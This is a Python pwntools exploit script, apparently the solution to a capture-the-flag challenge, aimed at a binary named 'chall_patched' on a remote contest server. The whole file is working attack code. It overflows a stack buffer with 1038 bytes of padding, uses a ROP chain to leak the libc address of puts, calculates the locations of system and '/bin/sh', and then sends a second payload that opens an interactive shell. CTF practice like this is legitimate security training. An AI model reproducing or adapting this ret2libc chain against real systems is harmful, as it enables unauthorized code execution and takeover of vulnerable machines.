#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=challs.htsp.ro' '--port=8001' chall_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.htsp.ro'
port = int(args.PORT or 8001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

io = start()

io.recvline()

pop_rdi = 0x00000000004008f3
ret = 0x00000000004005e6

payload = flat(
    b'A' * 1038,
    p64(pop_rdi),
    p64(exe.got.puts),
    p64(exe.plt.puts),
    p64(ret),
    p64(exe.sym.main),
)

io.sendline(payload)
io.sendline(b'done')

puts_got = int.from_bytes(io.recvline().strip(), byteorder = 'little')
info(f"got.puts leak: {hex(puts_got)}")

base_libc = puts_got - 0x000000000080970
system_libc = base_libc + 0x0000000004f420 
binsh_libc = base_libc + 0x1b3d88 

io.recvline()

payload = flat(
    b'A' * 1038,
    p64(pop_rdi),
    p64(binsh_libc),
    p64(system_libc),
)

io.sendline(payload)
io.sendline(b'done')

io.interactive()

